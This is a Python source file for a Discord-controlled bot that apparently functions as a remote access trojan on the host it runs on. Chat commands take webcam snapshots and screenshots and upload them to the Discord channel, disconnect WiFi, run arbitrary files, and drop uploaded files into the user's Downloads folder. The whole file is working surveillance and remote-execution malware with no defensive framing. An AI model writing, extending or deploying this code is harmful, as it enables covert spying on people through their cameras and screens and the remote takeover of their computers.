import discord
from discord.ext import commands
import os
import subprocess
import platform
import pyautogui
import cv2

# Create the bot instance
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

# Define the command to disconnect from WiFi
@bot.command(name='dis')
async def disconnect_wifi(ctx):
    try:
        if platform.system() == 'Windows':
            subprocess.run("netsh wlan disconnect", check=True, shell=True)
        elif platform.system() == 'Linux':
            subprocess.run("nmcli dev disconnect iface wlan0", check=True, shell=True)
        elif platform.system() == 'Darwin':
            subprocess.run("networksetup -setairportpower en0 off", check=True, shell=True)
        else:
            await ctx.send("Unsupported OS for this command.")
            return

        await ctx.send("Disconnected from WiFi.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

# Define the command to take a webcam snapshot
@bot.command(name='webcam_snap')
async def webcam_snap(ctx):
    try:
        cap = cv2.VideoCapture(0)  # 0 is usually the default webcam

        if not cap.isOpened():
            await ctx.send("Could not access the webcam.")
            return

        ret, frame = cap.read()

        if not ret:
            await ctx.send("Failed to capture image.")
            return

        image_path = "webcam_snap.jpg"
        cv2.imwrite(image_path, frame)
        cap.release()

        await ctx.send(file=discord.File(image_path))
        os.remove(image_path)

    except Exception as e:
        await ctx.send(f"An error occurred while capturing the webcam snapshot: {e}")

# Define the command to take a screenshot
@bot.command(name='screenshot')
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)

        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)

    except Exception as e:
        await ctx.send(f"An error occurred while taking the screenshot: {e}")

# Define the command to run a file
@bot.command(name='run')
async def run_file(ctx, file_path: str):
    try:
        if not os.path.isfile(file_path):
            await ctx.send(f"File not found: {file_path}")
            return
        
        if not os.access(file_path, os.X_OK):
            await ctx.send(f"File is not executable: {file_path}")
            return

        result = subprocess.run(file_path, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            await ctx.send(f"Successfully executed {file_path}\nOutput: {result.stdout}")
        else:
            await ctx.send(f"Error executing {file_path}\nError: {result.stderr}")
    
    except Exception as e:
        await ctx.send(f"An error occurred while running the file: {e}")

# Define the command to upload a file
@bot.command(name='inject')
async def upload_file(ctx):
    # Ensure the bot has a Downloads folder to save files
    downloads_dir = os.path.expanduser('~/Downloads')  # This will point to the user's Downloads folder
    if not os.path.exists(downloads_dir):
        os.makedirs(downloads_dir)

    # Wait for the user to send a file
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please upload a file.")
        return

    # Get the first attachment (you can extend this to handle multiple files)
    file = ctx.message.attachments[0]
    
    # Save the file to the Downloads directory
    file_path = os.path.join(downloads_dir, file.filename)
    await file.save(file_path)
    
    # Send a confirmation message
    await ctx.send(f"File {file.filename} has been uploaded and saved to {file_path}.")

# Start the bot with your token
bot.run('YOUR_BOT_TOKEN')
